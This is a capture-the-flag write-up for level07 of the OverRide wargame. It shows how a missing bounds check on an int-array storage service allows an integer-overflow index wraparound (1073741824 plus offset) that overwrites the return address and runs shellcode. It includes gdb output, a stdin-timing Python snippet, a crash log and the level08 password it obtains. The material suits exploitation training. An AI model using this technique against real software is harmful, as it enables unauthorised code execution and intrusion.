# Level 07

This level is a storage system, the storage is an array of 100 ints but there
is a catch: you cannot store data at index divisible by 3 (or 0).

```
Array:
. are writable indexes
x are not writable indexes

0xffffd464: x..x
0xffffd474: ..x.
0xffffd484: .x..
0xffffd494: x..x
0xffffd4a4: ..x.
0xffffd4b4: .x..
0xffffd4c4: x..x
0xffffd4d4: ..x.
0xffffd4e4: .x..
0xffffd4f4: x..x
0xffffd504: ..x.
0xffffd514: .x..
0xffffd524: x..x
0xffffd534: ..x.
0xffffd544: .x..
0xffffd554: x..x
0xffffd564: ..x.
0xffffd574: .x..
0xffffd584: x..x
0xffffd594: ..x.
0xffffd5a4: .x..
0xffffd5b4: x..x
0xffffd5c4: ..x.
0xffffd5d4: .x..
0xffffd5e4: x..x
```


Other than that, there is no fstring exploit possible, no string buffer overflow,
the arguments are zeroed-out, the environment is zeroed-out and there is a stack canary.

The catch is that the length of the array is never checked, which means that
we can overflow the array.
This has an even better side effect: as it is an array of int we can overflow
the array so much that we can go back to the initial array pointer:

```
Normal behavior:

	base:	0xffffd464
	index:	4
	adress to store: 0xffffd464 + (4 * sizeof(int)) = 0xffffd474

	Storing at address: 0xffffd474

Hacked behavior:

	base:	0xffffd464
	index:	1073741824
	address to store: 0xffffd464 + (1073741824 * sizeof(int)) = 0x1ffffd464
                                                                   |      |
	WARNING: 0x1ffffd464 is more than 32 bits so it overflows       32 bit

	storing address: 0xffffd464 because the first bit was overflowing
```

Why is this great? because it makes avaliable to us the possibility of writing
to indexes divisible by 3. When we want to write to an index that is a multiple
of three, we just need to add 1073741824 to it, because it overflows the array
perfectly to its beginning, and is not divisible by 3.

By putting the numbers to the indexes 1073741824, 1, 2 and (1073741824 + 3)
we can store data to the first 4 indexes of the array without restriction.

```
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 100
 Index: 1073741824
 Completed store command successfully
Input command: store
 Number: 101
 Index: 1
 Completed store command successfully
Input command: store
 Number: 102
 Index: 2
 Completed store command successfully
Input command: store
 Number: 103       
 Index: 1073741827
 Completed store command successfully
```

```gdb
(gdb) x/4d 0xffffd464
0xffffd464:     100     101     102     103
```

Now that's one less problem, but what are we gonna do with this?

We can store continous shellcode in it. Also, the return address of the function
is writable with the overflow. Normally to write to this address we would've
try to write on the index 114 of the array, but 114 is divisible by 3.
Now we can just write on the index 1073741938 (1073741824 + 114) and it works, we
have code redirection.

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 42
 Index: 1073741938
 Completed store command successfully
Input command: quit
Segmentation fault (core dumped)
level07@OverRide:~$ dmesg | tail -n1
[ 5399.490681] level07[1916]: segfault at 2a ip 000000000000002a sp 00000000ffffd650 error 14 in level07[8048000+1000]
```

We can see that we are segfaulting to the address that corresponds to the input value.

We have another problem, the program has a script protection that clears stdin
before trying another scanf. Fortunately we can bypass it with something like this:

```py
import time

usleep = lambda x: time.sleep(x / 1000000.0)

def p(x):
    print(x)
    usleep(100)

p("store")
```

This `p()` function will wait that the stdin is cleared to hand back the
execution of the script, thus allowing us to re-write something later.

Now we can write any bit of data, with a script, to our program's memory:


```gdb
(gdb) r < <(python /tmp/level07/script.py)
Starting program: /home/users/level07/level07 < <(python /tmp/level07/script.py)
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully

[...]

Input command:  Number:  Index:  Completed store command successfully
(gdb) x/100d 0xffffd464
0xffffd464:     0       1       2       3
0xffffd474:     4       5       6       7
0xffffd484:     8       9       10      11
0xffffd494:     12      13      14      15
0xffffd4a4:     16      17      18      19
0xffffd4b4:     20      21      22      23
0xffffd4c4:     24      25      26      27
0xffffd4d4:     28      29      30      31
0xffffd4e4:     32      33      34      35
0xffffd4f4:     36      37      38      39
0xffffd504:     40      41      42      43
0xffffd514:     44      45      46      47
0xffffd524:     48      49      50      51
0xffffd534:     52      53      54      55
0xffffd544:     56      57      58      59
0xffffd554:     60      61      62      63
0xffffd564:     64      65      66      67
0xffffd574:     68      69      70      71
0xffffd584:     72      73      74      75
0xffffd594:     76      77      78      79
0xffffd5a4:     80      81      82      83
0xffffd5b4:     84      85      86      87
0xffffd5c4:     88      89      90      91
0xffffd5d4:     92      93      94      95
0xffffd5e4:     96      97      98      99
```

Great! Now we just need to put the shellcode on the code and the return address
to the beginning of the shellcode.

This is written on the script, with a little of trial and error we can make
our address hit the shellcode

```bash
level07@OverRide:~$ (python /tmp/level07/script.py; cat -) | env -i ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

[...]

Input command:  Number:  Index:  Completed store command successfully
whoami
level08
cd ../level08
cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```